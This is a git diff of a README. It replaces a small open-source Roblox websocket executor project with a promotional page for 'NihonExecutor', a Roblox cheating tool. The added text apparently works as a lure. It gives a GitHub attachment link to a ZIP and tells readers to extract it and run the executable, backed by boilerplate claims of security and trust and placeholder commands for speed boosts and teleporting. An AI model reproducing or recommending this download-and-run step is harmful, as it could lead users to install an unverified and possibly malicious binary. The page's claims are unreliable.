@@ -1,28 +1,76 @@
-# Roblox Websocket Executor
+# NihonExecutor
 
-A Roblox "executor", created using the Synapse X websocket library and a C# websocket server.
+Nihon is a leading Roblox exploit founded in 2020, known for its intuitive user interface, robust features, and exceptional performance. Developed by top industry professionals, it offers enhanced security, customization options, and a globally trusted service.
 
-## How to use
+![Nihon Logo](nihon_logo.png)
 
-To use the client, place the [script](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/client_release.lua) in your exploit's (I have only tested this using Synapse X) "autoexec" directory, and whenever you join a game in Roblox, it will start the client, which will try to connect to the server.
+## Table of Contents
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
 
-To use the server, download the [executor's ZIP](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/server_release.zip) onto your computer, extract it, and run the executable. It will start the server, and it will allow you to execute scripts.
+## Introduction
 
-### Demonstration
+Welcome to the official repository of NihonExecutor, the cutting-edge Roblox exploit that sets new standards in the industry. Nihon is designed and maintained by a team of skilled professionals who are committed to providing the best user experience for all Roblox enthusiasts.
 
-https://user-images.githubusercontent.com/120275751/225953612-1b6de800-0373-416d-b3d0-c0699ecb2061.mp4
+## Features
 
-## Further explanation
+- **Intuitive User Interface**: Nihon offers a user-friendly interface that makes it easy to navigate and customize settings.
+- **Robust Features**: This exploit comes packed with powerful features to enhance your gameplay and give you an edge in Roblox.
+- **Exceptional Performance**: Nihon is optimized for speed and reliability to ensure a smooth experience while using the exploit.
+- **Enhanced Security**: Your safety is our top priority, and Nihon includes advanced security measures to protect your account and data.
+- **Customization Options**: Tailor Nihon to your preferences with a range of customization options available.
+- **Globally Trusted Service**: Join a community of users who trust Nihon for their Roblox exploits.
 
-There is a WebSocket server in C# user interface. When the user executes a script, it broadcasts to connected clients with the script they want to execute.
+## Installation
 
-The client is written in Lua, on first execution, it will tell the server to execute files in the "autoexec" directory of the executor, it will also hook into the print, warn, and error function, and it will broadcast each output, to allow for an external console.
+To get started with NihonExecutor, follow these simple steps:
 
-This isn't useful, and this serves as a proof of concept. However, this does have some advantages over using an API like [SXLib](https://github.com/XarienC/Synapse-X-Open-Source-UI) (Synapse X's library), such as being able to hook outputs like print or warn, for an external console in a custom UI, however you could probably do a combination of SXLib and websockets, as you wouldn't need to include the client in "autoexec", as SXLib could automatically execute that for you.
+1. Download the NihonExecutor ZIP file from the link below:
+[![Download NihonExecutor](https://img.shields.io/badge/Download-NihonExecutor-orange)](https://github.com/user-attachments/files/16119741/Nihon.zip)
 
-## Attribution
+2. Extract the contents of the ZIP file to a location of your choice on your computer.
 
-Here are a list of open-source libraries used by this project.
+3. Run the executable file and follow the on-screen instructions to install NihonExecutor.
 
-- [sta/websocket-sharp](https://github.com/sta/websocket-sharp): WebSocket library used
-- [PavelTorgashov/FastColoredTextBox](https://github.com/PavelTorgashov/FastColoredTextBox): Syntax highlighted textbox used
+## Usage
+
+Once you have successfully installed NihonExecutor, you can launch the exploit and start exploring its features. Here are some basic commands to get you started:
+
+- `executecommand`: Execute a specific command within the exploit.
+- `settingsoption`: Access and adjust various settings within NihonExecutor.
+- `explorefeature`: Discover the range of features available in NihonExecutor.
+
+For more advanced usage and customization options, refer to the documentation included in the NihonExecutor package.
+
+## Examples
+
+Here are some examples of how NihonExecutor can enhance your Roblox experience:
+
+### Example 1: Speed Boost
+With NihonExecutor, you can activate a speed boost feature that allows your character to move faster in the game.
+
+```
+executecommand speedboost on
+```
+
+### Example 2: Teleportation
+Use NihonExecutor's teleportation feature to quickly navigate to different locations within Roblox worlds.
+
+```
+executecommand teleport LocationName
+```
+
+## Contributing
+
+We welcome contributions from the community to help improve NihonExecutor and make it even better. If you have ideas, suggestions, or bug fixes, feel free to submit a pull request.
+
+Before contributing, please review our [Contribution Guidelines](CONTRIBUTING.md).
+
+## License
+
+NihonExecutor is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
